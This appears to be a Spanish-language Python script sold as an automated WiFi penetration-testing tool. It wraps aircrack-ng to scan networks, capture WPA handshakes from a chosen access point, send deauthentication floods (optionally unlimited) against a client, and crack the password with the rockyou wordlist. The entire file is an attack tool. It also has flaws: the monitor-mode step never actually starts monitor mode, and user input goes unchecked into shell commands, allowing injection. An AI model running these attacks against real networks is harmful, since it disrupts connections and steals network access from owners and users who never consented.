import subprocess
import time
import threading
import os
import signal
import sys
from colorama import init, Fore, Style

init(autoreset=True)

def verificar_dependencias():
    """Verifica si las dependencias necesarias están instaladas."""
    dependencies = ['airodump-ng', 'aireplay-ng', 'aircrack-ng']
    faltantes = []

    for dependency in dependencies:
        if subprocess.run(f"which {dependency}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
            print(f"{Fore.RED}No se encontró '{dependency}'. Asegúrate de tener instalada la suite aircrack-ng.{Style.RESET_ALL}")
            faltantes.append(dependency)

    if faltantes:
        print(f"{Fore.YELLOW}Instalando aircrack-ng...{Style.RESET_ALL}")
        try:
            subprocess.run("sudo apt install -y aircrack-ng", shell=True, check=True)
            print(f"{Fore.GREEN}aircrack-ng instalado correctamente.{Style.RESET_ALL}")
            return True
        except subprocess.CalledProcessError:
            print(f"{Fore.RED}Error al instalar aircrack-ng. Por favor, instala manualmente.{Style.RESET_ALL}")
            return False
    return True

def limpiar_terminal():
    """Limpia la terminal según el sistema operativo."""
    if os.name == 'posix':  
        subprocess.run(['clear'])
    elif os.name == 'nt':   
        subprocess.run(['cls'], shell=True)

def imprimir_ascii_art():
    """Imprime ASCII art con color."""
    ascii_art = f"""
{Fore.GREEN}
 __          ___  __ _             _____                _    _             
 \ \        / (_)/ _(_)           / ____|              | |  (_)            
  \ \  /\  / / _| |_ _   ______  | |     _ __ __ _  ___| | ___ _ __   __ _ 
   \ \/  \/ / | |  _| | |______| | |    | '__/ _` |/ __| |/ / | '_ \ / _` |
    \  /\  /  | | | | |          | |____| | | (_| | (__|   <| | | | | (_| |
     \/  \/   |_|_| |_|           \_____|_|  \__,_|\___|_|\_\_|_| |_|\__, |
                                                                      __/ |
                                                                     |___/ 
                                                                     
                                                                 by {Fore.BLUE}Saimonch16{Style.RESET_ALL}
                                                                 
                                                                 
                                                                 
{Fore.RED}*** HERRAMIENTA AUTOMATIZADA PARA LA PRUEBA DE PENETRACION EN REDES WIFI ***{Style.RESET_ALL}
    """
    print(ascii_art)

def ejecutar_comando(comando, timeout=None):
    """Ejecuta un comando en la terminal y devuelve la salida."""
    print(f"{Fore.YELLOW}Ejecutando comando: {comando}")
    try:
        resultado = subprocess.run(comando, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=timeout)
        print(f"{Fore.GREEN}Salida:\n{resultado.stdout}")
        return resultado.stdout
    except subprocess.TimeoutExpired:
        print(f"{Fore.RED}El comando ha superado el tiempo de espera de {timeout} segundos.")
        return None
    except subprocess.CalledProcessError as e:
        print(f"{Fore.RED}Error:\n{e.stderr}")
        return None

def mostrar_interfaces_red():
    """Muestra las interfaces de red disponibles usando iwconfig."""
    comando = "iwconfig"
    ejecutar_comando(comando)

def establecer_modo_monitor():
    """Establece una interfaz de red en modo monitor."""
    mostrar_interfaces_red()
    interface = input(f"{Fore.YELLOW}Introduce la interfaz de red para establecer en modo monitor (por ejemplo, wlan0): {Style.RESET_ALL}")
    if interface.strip():  
        comando = f"airmon-ng start {interface}"
        comando = f"sudo airmon-ng check kill"
        ejecutar_comando(comando)
        return interface  

def escanear_redes(interface, duracion):
    """Escanear redes disponibles en el área."""
    comando = f"airodump-ng --write-interval 1 --output-format csv -o csv/{interface} {interface}"
    print(f"{Fore.YELLOW}Escanear redes en curso en {interface}...")

    proceso = subprocess.Popen(comando, shell=True, preexec_fn=os.setsid)

    try:
        time.sleep(duracion)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Escaneo interrumpido manualmente.")
    finally:
        try:
            os.killpg(os.getpgid(proceso.pid), signal.SIGINT)
        except Exception as e:
            print(f"{Fore.RED}Error al detener el proceso: {e}")

    time.sleep(2)

def capturar_paquetes(interface, bssid, canal, archivo_salida):
    """Capturar paquetes en segundo plano."""
    terminal_command = sys.platform.startswith('linux') and 'x-terminal-emulator' or 'open'
    comando = f"{terminal_command} -e airodump-ng --bssid {bssid} -c {canal} -w {archivo_salida} {interface}"
    ejecutar_comando(comando)

def desautenticar_cliente(interface, bssid, cliente):
    """Enviar paquetes de desautenticación a un cliente específico."""
    while True:
        try:
            num_paquetes = int(input(f"{Fore.YELLOW}Introduce el número de paquetes a enviar (0 para enviar indefinidamente): {Style.RESET_ALL}"))
            if num_paquetes < 0:
                print(f"{Fore.RED}El número de paquetes debe ser mayor o igual a cero. Inténtalo de nuevo.{Style.RESET_ALL}")
            else:
                break
        except ValueError:
            print(f"{Fore.RED}Número de paquetes inválido. Inténtalo de nuevo.{Style.RESET_ALL}")

    comando = f"aireplay-ng --deauth {num_paquetes} -a {bssid} -c {cliente} {interface}"
    resultado = ejecutar_comando(comando)
    if resultado is not None:
        print(resultado)

    while True:
        repetir = input(f"{Fore.YELLOW}¿Deseas repetir el ataque de desautenticación? (s/n): {Style.RESET_ALL}").strip().lower()
        if repetir == 's':
            desautenticar_cliente(interface, bssid, cliente)  
            break
        elif repetir == 'n':
            break
        else:
            print(f"{Fore.RED}Opción no válida. Por favor, responde 's' o 'n'.{Style.RESET_ALL}")


def crackear_contraseña(archivo_cap, bssid, diccionario):
    """Crackear la contraseña de una red WPA/WPA2."""
    comando = f"aircrack-ng -a2 -b {bssid} -w {diccionario} {archivo_cap}"
    resultado = ejecutar_comando(comando)
    if resultado is not None:
        print(resultado)

def mostrar_menu():
    print(f"\n{Fore.CYAN}Menú de opciones:")
    print("1. Establecer modo monitor")
    print("2. Escanear redes")
    print("3. Capturar paquetes")
    print("4. Desautenticar cliente")
    print("5. Crackear contraseña")
    print("6. Salir")

def seleccionar_interfaz():
    while True:
        mostrar_interfaces_red()  
        interface = input(f"{Fore.YELLOW}Introduce la interfaz de red (por ejemplo, wlan0): {Style.RESET_ALL}")
        if interface.strip():  
            return interface
        else:
            print(f"{Fore.RED}Por favor, introduce una interfaz válida.{Style.RESET_ALL}")

def seleccionar_bssid():
    while True:
        bssid = input(f"{Fore.YELLOW}Introduce el BSSID del objetivo (por ejemplo, 00:11:22:33:44:55): {Style.RESET_ALL}")
        if bssid.strip(): 
            return bssid
        else:
            print(f"{Fore.RED}Por favor, introduce un BSSID válido.{Style.RESET_ALL}")

def seleccionar_canal():
    while True:
        canal = input(f"{Fore.YELLOW}Introduce el canal del objetivo (por ejemplo, 6): {Style.RESET_ALL}")
        if canal.strip(): 
            return canal
        else:
            print(f"{Fore.RED}Por favor, introduce un canal válido.{Style.RESET_ALL}")

def seleccionar_archivo_salida():
    while True:
        archivo_salida = input(f"{Fore.YELLOW}Introduce el nombre del archivo de salida (sin extensión): {Style.RESET_ALL}")
        if archivo_salida.strip(): 
            return archivo_salida
        else:
            print(f"{Fore.RED}Por favor, introduce un nombre de archivo válido.{Style.RESET_ALL}")

def seleccionar_diccionario():
    while True:
        opcion = input(f"{Fore.YELLOW}¿Quieres usar el diccionario por defecto (/usr/share/wordlists/rockyou.txt)? (s/n): {Style.RESET_ALL}").strip().lower()
        if opcion == 's':
            return '/usr/share/wordlists/rockyou.txt'
        elif opcion == 'n':
            diccionario = input(f"{Fore.YELLOW}Introduce la ruta al diccionario personalizado (por ejemplo, /ruta/al/diccionario.txt): {Style.RESET_ALL}")
            if diccionario.strip():  
                return diccionario
            else:
                print(f"{Fore.RED}Por favor, introduce una ruta válida.{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}Opción no válida. Por favor, responde 's' o 'n'.{Style.RESET_ALL}")

def seleccionar_cliente():
    while True:
        cliente = input(f"{Fore.YELLOW}Introduce la MAC del cliente (por ejemplo, AA:BB:CC:DD:EE:FF): {Style.RESET_ALL}")
        if cliente.strip():  
            return cliente
        else:
            print(f"{Fore.RED}Por favor, introduce una dirección MAC válida.{Style.RESET_ALL}")

def main():
    limpiar_terminal()
    imprimir_ascii_art()

    if not verificar_dependencias():
        return

    interfaz_modomonitor = None

    while True:
        mostrar_menu()
        try:
            opcion = input(f"{Fore.YELLOW}Selecciona una opción: {Style.RESET_ALL}")

            if opcion == '1':
                interfaz_modomonitor = establecer_modo_monitor()

            elif opcion == '2':
                if interfaz_modomonitor:
                    duracion_escaneo = input(f"{Fore.YELLOW}Introduce la duración del escaneo en segundos: {Style.RESET_ALL}")
                    if duracion_escaneo.strip() and duracion_escaneo.isdigit():
                        duracion_escaneo = int(duracion_escaneo)
                        escanear_redes(interfaz_modomonitor, duracion_escaneo)
                    else:
                        print(f"{Fore.RED}Por favor, introduce una duración válida en segundos.{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}Primero debes establecer una interfaz en modo monitor.{Style.RESET_ALL}")

            elif opcion == '3':
                if interfaz_modomonitor:
                    bssid_objetivo = seleccionar_bssid()
                    canal_objetivo = seleccionar_canal()
                    archivo_salida = seleccionar_archivo_salida()

                    threading.Thread(target=capturar_paquetes, args=(interfaz_modomonitor, bssid_objetivo, canal_objetivo, archivo_salida)).start()
                else:
                    print(f"{Fore.RED}Primero debes establecer una interfaz en modo monitor.{Style.RESET_ALL}")

            elif opcion == '4':
                if interfaz_modomonitor:
                    bssid_objetivo = seleccionar_bssid()
                    cliente = seleccionar_cliente()
                    desautenticar_cliente(interfaz_modomonitor, bssid_objetivo, cliente)
                else:
                    print(f"{Fore.RED}Primero debes establecer una interfaz en modo monitor.{Style.RESET_ALL}")

            elif opcion == '5':
                archivo_salida = seleccionar_archivo_salida()
                bssid_objetivo = seleccionar_bssid()
                diccionario = seleccionar_diccionario()
                crackear_contraseña(f"{archivo_salida}-01.cap", bssid_objetivo, diccionario)

            elif opcion == '6':
                print(f"{Fore.YELLOW}Saliendo...{Style.RESET_ALL}")
                break

            else:
                print(f"{Fore.RED}Opción no válida. Por favor, intenta de nuevo.{Style.RESET_ALL}")

        except EOFError:
            print(f"\n{Fore.RED}Error al leer la opción. Saliendo del programa.{Style.RESET_ALL}")
            break
        except KeyboardInterrupt:
            print(f"\n\n{Fore.RED}Interrupción del usuario. Saliendo del programa.{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    main()
